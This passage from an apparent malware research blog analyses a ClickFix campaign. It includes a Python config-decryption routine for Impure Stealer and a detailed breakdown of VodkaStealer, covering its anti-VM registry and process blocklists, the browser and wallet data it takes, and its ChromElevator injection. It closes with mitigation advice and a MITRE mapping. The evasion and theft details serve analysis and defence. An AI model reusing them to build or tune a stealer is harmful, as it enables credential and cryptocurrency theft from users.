    	if len(alphabet) != 16 or len(set(alphabet)) != 16:
    		raise ValueError("The alphabet must be 16 unique characters.")
    	if (len(hex_ciphertext) & 3) != 0:
    		raise ValueError("Input length must be a multiple of 4 characters.")
    
        lut = {ch: i for i, ch in enumerate(alphabet)}
        out = []
    	for i in range(len(hex_ciphertext) // 4):
    		try:
                n0 = lut[hex_ciphertext[i * 4 + 0]]
                n1 = lut[hex_ciphertext[i * 4 + 1]]
                n2 = lut[hex_ciphertext[i * 4 + 2]]
                n3 = lut[hex_ciphertext[i * 4 + 3]]
    		except KeyError as e:
    			raise ValueError(f"Character {e.args[0]!r} not in alphabet") from None
    
    		v = n0 | (n1 << 4) | (n2 << 8) | (n3 << 12)
            ch = (v ^ key ^ (i * 7)) & 0xFFFF
    		out.append(chr(ch))
    
    	return "".join(out)

As with Vidar, we share a [public script](https://github.com/rapid7/Rapid7-Labs/blob/main/Malware%20Config%20Extractors/impure_stealer_extract.py) to extract decrypted strings and any C2 configuration contained therein from the stealer samples.

### VodkaStealer

The latest payload observed at the end of the DoubleDonut chain is a new custom C++ stealer, which has been named VodkaStealer and [first analyzed by researcher xto9ot](https://xto9ot.gitbook.io/malware-analysis/clickfix-campaign-russian-threat-actor-evolves-to-custom-infostealer). This stealer can confidently be attributed to the developer of the DoubleDonut loader due to many overlapping characteristics of both binaries, such as the exact same mechanism for downloading and injecting additional payloads into other service host processes, as well as reuse of DoubleDonut C2 infrastructure.

Compared to the previous payloads, including Vidar and Impure Stealer, as well as StealC, Rhadamanthys, and AuraStealer — which have been observed delivered in the same campaign by researchers at [LevelBlue](https://www.levelblue.com/blogs/spiderlabs-blog/how-clickfix-opens-the-door-to-stealthy-stealc-information-stealer) and [Intrinsec](https://www.intrinsec.com/wp-content/uploads/2026/02/TLP-CLEAR-AuraStealer-EN.pdf) — the new stealer lacks significantly in anti-analysis and stealth capabilities, missing out on any kind of binary obfuscation, and staging temporary files to disk, in plaintext and with fully descriptive filenames, before exfiltration. Furthermore, in order to bypass Chrome v20 App-Bound Encryption, the stealer tries to download and run a separate helper binary, the open-source “ChromElevator” tool (source code is found on [GitHub](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)), hosted on the same C2 server as the loader shellcode.

This begs the question why an attacker with access to the latest cutting-edge infostealers would fall back to a custom stealer written potentially from scratch. One speculative explanation is of an economical nature — commercial infostealers are expensive, while small software PoC development, including malware development, is becoming widely available thanks to pre-trained transformer LLMs, with open-source “red team” tools like ChromElevator available to aid with the more technically challenging aspects. However, this is all pure speculation, and Rapid7 Labs will keep tracking the campaign to collect more intelligence and draw more definitive conclusions.

As is the case with practically all commodity infostealers, the sample starts by checking if any of the enabled keyboard layouts match the Russian language, and if the public IP of the infected machine suggests location within Russia or Belarus. In these cases, the malware terminates.

![08-vodka-geocheck.png](https://www.rapid7.com/cdn/images/bltef9ed65e5a986e5f/69af1c56f2eef0000852634a/08-vodka-geocheck.png) _Figure 17: Code listing from the WinMain function illustrates geographical checks._

⠀

Next, the stealer checks if either the file %Temp%\sysinfo_user_marker.marker or the mutex Global\sysinfo_single_instance exists, and if so, terminates execution. An anti-debug check is performed by calling IsDebuggerPresent, CheckRemoteDebuggerPresent, a combination of Sleep and GetTickCount, as well as querying the registry for presence of the following keys:

  * HKLM\SOFTWARE\VMware, Inc.\VMware Tools

  * HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions

  * HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters

  * HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest

  * HKLM\SYSTEM\CurrentControlSet\Services\vmci

  * HKLM\SYSTEM\CurrentControlSet\Services\vmmouse




Lastly, a process snapshot is taken and scanned for the following blacklisted process names: vmtoolsd.exe, vmwareuser.exe, vmwaretray.exe, vmware-vmx.exe, vboxservice.exe, vboxtray.exe, vboxdisp.exe, vboxguest.exe, vgauthservice.exe, vmwareauthd.exe, sbiesvc.exe, sbiecnt.exe, sandboxiedcomlaunch.exe, qemu-ga.exe, xenservice.exe, vmsrvc.exe, vmusrvc.exe.

Following a successful anti-debug scan, the malware queries up to 8 different browser data locations in %AppData% and %LocalAppData%, targeting Google Chrome, Microsoft Edge, Brave, Opera, Opera GX, Vivaldi, Yandex, and Chromium browsers, and kills all processes matching any of these browsers’ executable names.

Then, various pieces of system information are collected and a directory is created according to this format:
    
    
    wsprintfA(PathName,
    "%s\\sysinfo_%s_%s_%02d%02d%04d%02d%02d",
            temp_dir_path,
            ipinfo_country_code,
            ipinfo_query,
            SystemTime.wDay,
            SystemTime.wMonth,
            SystemTime.wYear,
            SystemTime.wHour,
            SystemTime.wMinute);
    CreateDirectoryA(PathName, 0);

The stealer then performs the main data collection:

  * A list of installed software packages, obtained from standard Uninstall registry keys, is written into a file InstalledSoftware.txt in the staging directory,

  * Files from wallet- and extension-specific directories in all browser data directories are collected (using a hardcoded list of targeted wallet and extension IDs),

  * A screenshot is taken and saved, using the GetDC, BitBlt and GdipSaveImageToFile APIs from gdiplus.dll,

  * If any encryption-enabled browser (e.g. Chrome) is installed:

    * chromelevator.bin is downloaded from the loader C2 as described before and injected into _another_ hijacked native svchost.exe process using the same mechanism seen in the DoubleDonut loader,

    * Once the remote thread finishes execution, files from %Temp%\chromelevator_output are moved to the staging directory;

  * If any non-encryption-enabled browser (e.g. Firefox) is installed:

    * Its logins.json, cookies.sqlite, key4.db and cert9.db files are staged;

  * AppData files from the following natively installed applications are collected:

    * FileZilla, OpenVPN Connect, Exodus, Electrum, Jaxx, Guarda, Ledger Live, Ledger Wallet, Trezor, Bitcoin, Coinomi, Litecoin;

  * System information is collected into a file named systeminfo.txt inside the staging directory.




One thing both the threat actor and previous analyses missed is that the injection of ChromElevator into the target service host process is currently broken and will silently fail. Because we feel no need to help the actor fix their mistake, we will not describe why this is the case. However, it may be that the threat actor has already noticed the missing functionality around February 22, when the ClickFix injection scripts described before suddenly seem to have been temporarily disabled — the infected websites still load the injector script from either the 3rd-party JavaScript host server or their own admin-ajax.php, but the response is empty.

Because VodkaStealer does not perform any string encryption in its payloads, the C2 IP address can be extracted directly from the unpacked sample. Besides C2 information, we’re unaware of any additional configuration shipped with the stealer, but this may be simply because the malware is still in early stages of development.

## Mitigation guidance

It remains unclear by what means the attackers are compromising the targeted WordPress websites. The most likely scenarios include either a WordPress plugin or theme vulnerability being exploited, previously stolen credentials being misused, or potentially even publicly accessible wp-admin interfaces — which have been observed on most of the compromised websites — being accessed through a brute-force password spraying attack. Keeping these scenarios in mind, we urge WordPress site administrators to:

  * Regularly review all software components for outdated versions and perform vulnerability scans to identify and mitigate weaknesses,

  * Use long and unpredictable passwords for administrative access, possibly using a password manager for audited security and convenience,

  * Set up a second authentication factor for administrative access,

  * Avoid running untrusted code on devices that store credentials (e.g. saved logins in a browser) usable to administer the website.




The best defense for individuals browsing the web is to stay cautious, maintain a zero-trust mindset, use reputable security software, and keep themselves up to date with the latest phishing and ClickFix tactics used by malicious actors. An important takeaway from this report should be that **even trusted websites can be compromised** and weaponised against unsuspecting visitors.

An additional precaution that can be effective on Windows systems is disabling the Run dialog shortcut (Windows Key+R); however, this will not prevent malicious commands from being pasted into a terminal or a Windows Explorer location bar (cf. _FileFix_ attack).

To help defenders mitigate this threat in their organization, we provide an extensive list of IoCs and a set of detection rules further below.

## Conclusion

Social engineering remains one of the most effective initial access tactics used by threat actors. The ClickFix campaign described in this blog illustrates just how easily unsuspecting users can be tricked into having their credentials stolen and exfiltrated to an attacker during perfectly ordinary web browsing. Without the victim even noticing that a compromise took place, their credentials can subsequently be misused for impersonation, further access to company resources, financial theft, or even to spread the social engineering lures to an even wider audience.

The large-scale execution of the compromise across completely unrelated WordPress instances suggests a high level of automation by the threat actor and is likely part of an organized long-term criminal effort. Despite this, the technical and operational sophistication of the campaign is limited and we provide a comprehensive technical breakdown of the infection chain, as well as a set of detection rules to defend against this threat in depth.

**Want to learn more?**[**Watch the webinar here.**](https://www.brighttalk.com/webcast/10457/664168?utm_source=Rapid7&utm_medium=brighttalk&utm_campaign=664168?utm_source=brighttalk&utm_medium=blog&utm_content=blog-cta&utm_campaign=global-pla-q1-2026-exploiting-trust-at-scale-webinar-prospect-eng)

## Indicators of Compromise (IOCs)

The complete list of IOCs for this campaign is found in our public GitHub repository: [ClickFix_DoubleDonut_Campaign_IOCs.txt](https://github.com/rapid7/Rapid7-Labs/blob/main/IOCs/ClickFix_DoubleDonut_Campaign_IOCs.txt).

## YARA Detection Rules

The detection rules for this campaign are found in our public GitHub repository: [ClickFix_DoubleDonut_Campaign.yar](https://github.com/rapid7/Rapid7-Labs/blob/main/Yara/ClickFix_DoubleDonut_Campaign.yar).

## MITRE ATT&CK Techniques

ID| Name| Specifically Relates To  
---|---|---  
T1583.001| Acquire Infrastructure: Domains| -  
T1584.006| Compromise Infrastructure: Web Services| -  
T1587.001| Develop Capabilities: Malware| DoubleDonut Loader, VodkaStealer  
T1588.001| Obtain Capabilities: Malware| Vidar Stealer, Donut Loader  
T1608.001| Stage Capabilities: Upload Malware| -  
T1608.004| Stage Capabilities: Drive-by Target| -  
T1189| Drive-by Compromise| -  
T1059.001| Command and Scripting Interpreter: PowerShell| -  
T1204.004| User Execution: Malicious Copy and Paste| -  
T1622| Debugger Evasion| -  
T1140| Deobfuscate/Decode Files or Information| -  
T1027.002| Obfuscated Files or Information: Software Packing| Donut Loader  
T1027.007| Obfuscated Files or Information: Dynamic API Resolution| Donut Loader, Vidar Stealer  
T1027.013| Obfuscated Files or Information: Encrypted/Encoded File| -  
T1055| Process Injection| Donut Loader  
T1620| Reflective Code Loading| Donut Loader  
T1497.001| Virtualization/Sandbox Evasion: System Checks| VodkaStealer  
T1497.003| Virtualization/Sandbox Evasion: Time Based Checks| VodkaStealer  
T1555| Credentials from Password Stores| -  
T1555.003| Credentials from Password Stores: Credentials from Web Browsers| -  
T1539| Steal Web Session Cookie| -  
T1552| Unsecured Credentials| -  
T1071.001| Application Layer Protocol: Web Protocols| -  
T1132.002| Data Encoding: Non-Standard Encoding| Impure Stealer  
T1573.001| Encrypted Channel: Symmetric Cryptography| Impure Stealer, VodkaStealer  
T1104| Multi-Stage Channels| -  
T1095| Non-Application Layer Protocol| Impure Stealer, VodkaStealer  
T1571| Non-Standard Port| Impure Stealer, VodkaStealer  
T1102.001| Web Service: Dead Drop Resolver| Vidar Stealer  
T1041| Exfiltration Over C2 Channel| -  
  
## Article tags

  * [Research](/blog/tag/research/)
  * [Labs](/blog/tag/labs/)